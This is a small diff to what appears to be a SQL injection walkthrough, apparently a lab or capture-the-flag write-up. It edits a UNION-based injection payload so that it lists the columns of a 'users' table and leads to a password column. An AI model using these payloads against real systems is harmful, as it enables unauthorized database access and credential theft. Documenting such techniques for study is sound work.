@@ -149,7 +149,7 @@ And we see the table named “users” (be careful not to confuse it with “use
 Using
 
 ```
-' UNION SELECT table_name,2,3,4 FROM information_schema.tables-- -
+' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
 to find the columns. I found a column named password in the output, so
